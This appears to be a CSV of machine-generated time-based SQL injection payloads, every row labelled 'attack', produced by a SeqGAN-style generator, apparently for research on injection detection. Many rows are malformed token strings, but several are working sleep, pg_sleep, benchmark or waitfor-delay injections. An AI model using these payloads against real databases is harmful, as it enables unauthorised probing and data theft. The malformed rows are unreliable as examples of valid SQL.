label,payload,family,payload_type,method,run_id,sample_index
attack,"""  )   as where 1547 sleep  (  5000000,md5  (  fdseddo  )    and   (  select 4240  =    (  'isintegratedsecurityonly'   )    )     )    a5  (  5   )    )     )  d'  =  'q  )   or sleep  (  5dm(  suvmqvmd5  (  5   )    )        )    )     )  y_TIME__TIME__uvvfqgepe""efboccjrag""  =  ""e'  =  'erpf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,995
attack,"1""   )    )     )   or in like 8507pg_sleep  (      select sleep  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,996
attack,"1%"" and   (  case el3114   (  select 6793  =    (  select rlike sleep  (  s_TIME__TIMDacjrjrar'  =  'b""  =  ""eefg""  =  ""be'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,997
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,998
attack,"1""  )   as )   where 7165  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,999
attack,"select pg_sleep  (  5000000,md5  (  5   )    )     )  srverpr  ) dbrerlvjrarvm",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1000
attack,",select benchmark  (  5   )    )     )  sdmq,mbrpfp    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1001
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1002
attack,select pg_sleep  (  5   )    )    and eends ru ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1003
attack,1 and sleep  (  substring   (    )   1   )    )     )  )    aser,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1004
attack,1'   )    )    ee   vbe   baiy,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1005
attack,select sleep  (  5   )    )ke   (  select   (    )    (   select'0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1006
attack,"1"" and from   )    )     )  sremdo  )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1007
attack,", if not  (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1008
attack,"1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'jro""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1009
attack,; 'sa' elik where 6175  =  7360  =  5702 rlike sleep  (  1210  0x694a4745   )    )     )  sdddo  )   waitfor delay '0:0:2' md,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1010
attack,"1""   )    asrlikey   (  _ )n     select '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1011
attack,", if not  0x6d457153   )    )    )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1012
attack,"1%""  )   as xiqw where 9862 4240 7165  =  benchmark  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1013
attack,", waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1014
attack,1' or benchmark  (  __TIME__TIMDp,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1015
attack,"; * from   )      )    )   or sleep  (  5   )    )     )  srmdpehao  )    waitfor delay 4240 from pg_sleep  (  5   )    )     )     _d5  (  5000000,m  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1016
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""ba'  =  'wmavf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1017
attack,1   )    )    asavbel_bbprpr wherekef,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1018
attack,; if not   (    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1019
attack,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ''  =  'wzerjyfpr,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1020
attack,"1""  )   )   as 8507jdu rliks where 5466  sleep  (  5   )    (    (   select 8514  3114  =  1  (   (  select * from   (  5   )    )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1021
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmfv'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1022
attack,1%' and mnt,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1023
attack,"; if not   (    (    (    (,sleep  (  5   )    )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1024
attack,", if not  )   sre   (  =       select 4240 from pg_sleep  (  10000000,MD5  (  0x6d457153   )    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1025
attack,;(  (  5   (    )    (    =   <> (  0x6d457153   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1026
attack,"1%"",efgnvfse'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1027
attack,"1"" and 'nvqf'  =  select sreefzn  )   as )  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1028
attack,1   )    as_bmserf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1029
attack,"$  (  10000000, if not  (  7908  )   edas h where 4871  =  ,sleep  (  5   )    )     )  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1030
attack,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""ervmf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1031
attack,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ia""  =  ""'  =  'iybocfczocx'  =  'wekaref",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1032
attack,"1""  )   adioafrom dcx where 9862 ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1033
attack,"1%,waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1034
attack,"select 9856  (  sleep  (  __TIME__TIME__  )      (    (    (   and select   (  select pg_sleep  (  5000000,md5  (  pg_sleep  )   ddu rlike 6793 like ""vwsleep  (dd5  (  5  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1035
attack,"""%""  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1036
attack,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'svpcuh",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1037
attack,1nin  )    (    (   'mmvf' 7165  =n or sleep  (  5  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1038
attack,1waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1039
attack,"""   )    )   or sleep  (  5 ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1040
attack,1%'   )    )     )   as pdvevbfg,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1041
attack,",waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1042
attack, or   (  5   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1043
attack,1'   )    )     )as <>* 8036  =  5702  )   ydpfdsu  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1044
attack,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'g,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1045
attack,  =  dsleep  )   as hjd or 4240  9443 gdt  =  ) rlike sleep  (  5   )    )   and   zprarerprrfps__TIMr,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1046
attack,"1"" where 7260  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1047
attack,"; from psrrryd  ,ed5  (  __TIME__  (    (   select 9443udd""  =  ""vcfq  )  ;waitfor benchmark  (  0x4c4d6142   )    )     ) ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1048
attack,0x6d457153   (  select * from   (  1  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1049
attack,"1   (    )   e   )    asygq  )    ydfdb""  =  ""b""  =  ""b",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1050
attack,""" or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1051
attack,waitfor delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1052
attack,"1""  )   or   (  5000000,mq e mdwse 8507   )    )    dmd5  (  substring   (  select rlike sleep  (  5  )   znddm  )    <> 3824  =  benchmark  (  0x6d457153   )   (  __TIME__  )    f",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1053
attack,"1""  )   as 7629   )    )   d   (    like 'fd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1054
attack,"1'   )    )     )   as xvucxrrnvdofxg""  =  ""u",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1055
attack,"1""  )   as where 8036 9856* from 8514  =  6767 and (  =  ssdsust",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1056
attack,1%' or   (  5  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1057
attack,"1"" waitfor delay '0:0:5' and ""dvfoxirn  =wdfsg"" like ""t'  =  'crir",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1058
attack,1'   )    )     )   as )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1059
attack,waitfor delay delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1060
attack,"1   )    )     )   e   ore sleep  (  10000000,24""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1061
attack,waitfor and   (    (  select 6793 from pg_sleep  (  5  )   and   (  'xobx'  =    (  ; (  (  __TIME__  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1062
attack,"waitfor ""'mymvcsertar_sotevf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1063
attack, jas where 7360  =  7360  =  6175 rlike sleep  (  5  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1064
attack,select sleep  (  __TI/jreahag'  =  'b'  =  'e'  =  'wcjrnaocrxel,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1065
attack,select sleep  (  5   )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1066
attack,1   )    or 5  (  5  )   and sleep  (  5   )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1067
attack,"1'   )    )     )   as E  (  select  (  'isintegratedsecurityonly'   )    )    and 8594  =    (  select   (  select 4240 ike sleep  (  5000000,md5  (  5  )   and   ifuds dms where 1547  (  sleep  (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1068
attack,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""iyvjybq""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1069
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1070
attack,1%'   )    )     )   or sleep  (  5   )    )     )  semq  (   else ddcentd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1071
attack,$  (  sleep  (  5  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1072
attack,"""  (   or sleepu  )    (    (   as crvlike sleep  (  _dmq  )   mds where td5  (  5   )    )     )  sdptd5  (  __TIME__  )bddonon_TIME__  )   select d and 4240  =    (    (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1073
attack,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'wrcfx'  =  'xrmyfx,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1074
attack,1%   )    )    ase,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1075
attack,""" like ""  )   and sleep  (  5000000,md5  (  _TIME__  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1076
attack,"1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1077
attack,"""   )    )     )   or benchmark  (  5   )    )     #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1078
attack,1'   )    )    as where 4871  =  'df,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1079
attack,1   )    aoagfs,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1080
attack,"1'   )    )     )   oror benchmark  (  10000000,MD5  (  10000000,MD5  (  5  (  select duudde where 4240 rlarlik.sleep  (  5  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1081
attack,; if not  )   md,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1082
